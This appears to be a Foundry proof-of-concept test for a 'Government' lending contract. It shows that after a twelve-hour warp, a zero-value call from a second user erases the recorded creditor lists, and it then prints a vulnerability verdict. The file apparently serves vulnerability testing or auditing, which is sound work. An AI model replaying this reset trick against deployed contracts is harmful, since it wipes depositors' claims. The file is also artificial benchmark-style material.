// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/list_dos.sol";

contract GovernmentTest is Test {
    Government public gov;
    address constant USER1 = address(0x1);
    address constant USER2 = address(0x2);
    uint256 constant PRECISION = 1e18;
    uint256 constant TWELVE_HOURS = 43200;

    function setUp() public {
        vm.deal(USER1, 10 * PRECISION);
        vm.deal(USER2, 10 * PRECISION);
        
        gov = new Government{value: 0}();
    }

    function testResetDos() public {
        // Validate initial state
        (address[] memory initialCreditors, ) = getCreditInfo();
        assertEq(initialCreditors.length, 0, "Initial creditors should be empty");
        
        // USER1 makes legitimate loan to start the system
        vm.prank(USER1);
        require(
            gov.lendGovernmentMoney{value: PRECISION}(address(0)), 
            "Legitimate loan should succeed"
        );
        
        // Validate system recorded legitimate loan
        (address[] memory creditors, uint256[] memory amounts) = getCreditInfo();
        assertEq(creditors.length, 1, "Should have one creditor");
        assertEq(creditors[0], USER1, "USER1 should be first creditor");
        assertEq(amounts[0], PRECISION * 110 / 100, "Credited amount mismatch");
        
        // Warp MORE than 12 hours to trigger reset condition
        vm.warp(block.timestamp + TWELVE_HOURS + 1);
        
        console.log("--- BEFORE-Trigger List ---");
        (address[] memory preCreditorAddresses, uint256[] memory preCreditorAmounts) = getCreditInfo();
        uint256 preCreditorAddressesLength = preCreditorAddresses.length;
        uint256 preCreditorAmountsLength = preCreditorAmounts.length;
        console.log("Creditor addresses count before reset:", preCreditorAddressesLength);
        console.log("Creditor amounts count before reset:", preCreditorAmountsLength);
        
        console.log("--- Trigger Reset ---");
        // USER2 triggers reset with zero-value transaction
        vm.prank(USER2);
        require(
            !gov.lendGovernmentMoney{value: 0}(address(0)),
            "Reset should activate with zero-value call"
        );
        
        console.log("--- AFTER-Trigger List ---");
        (address[] memory postCreditorAddresses, uint256[] memory postCreditorAmounts) = getCreditInfo();
        uint256 postCreditorAddressesLength = postCreditorAddresses.length;
        uint256 postCreditorAmountsLength = postCreditorAmounts.length;
        console.log("Creditor addresses count after reset:", postCreditorAddressesLength);
        console.log("Creditor amounts count after reset:", postCreditorAmountsLength);
        
        // Validate system was reset
        assertEq(postCreditorAddressesLength, 0, "Creditors should be reset");
        assertEq(postCreditorAmountsLength, 0, "Credits should be reset");

        // Vulnerability verdict based on state differential
        bool vulnerabilityValid = (preCreditorAddressesLength > 0) && 
                                  (preCreditorAmountsLength > 0) && 
                                  (postCreditorAddressesLength == 0) && 
                                  (postCreditorAmountsLength == 0);
                                  
        if (vulnerabilityValid) {
            console.log("Vulnerability Exists: Creditor lists were reset from %s entries to 0", preCreditorAddressesLength);
        } else {
            console.log("Vulnerability not Exist: Creditor lists not reset properly (before: %s, after: %s)", 
                        preCreditorAddressesLength, postCreditorAddressesLength);
        }
    }

    // Helper function to get contract credit information
    function getCreditInfo() public view returns (address[] memory, uint256[] memory) {
        return (gov.getCreditorAddresses(), gov.getCreditorAmounts());
    }
}